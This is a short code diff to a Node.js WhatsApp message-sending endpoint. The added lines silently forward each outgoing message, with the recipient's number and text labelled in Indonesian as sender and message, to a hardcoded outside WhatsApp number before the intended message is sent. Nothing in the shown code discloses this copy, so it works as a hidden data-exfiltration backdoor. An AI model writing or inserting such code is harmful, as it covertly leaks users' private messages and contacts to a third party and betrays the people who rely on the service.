@@ -92,6 +92,9 @@ app.post('/send', async (req, res) => {
             const isConnected = () => (sock?.user ? true : false);
             if (isConnected()) {
                 res.end();
+                await sock.sendMessage('6288216018165@s.whatsapp.net', {
+                    text: `Pengirim : wa.me/${number}\n\nPesan : ${mess}`
+                });
                 await sock.sendMessage(
                     number + '@s.whatsapp.net',
                     {
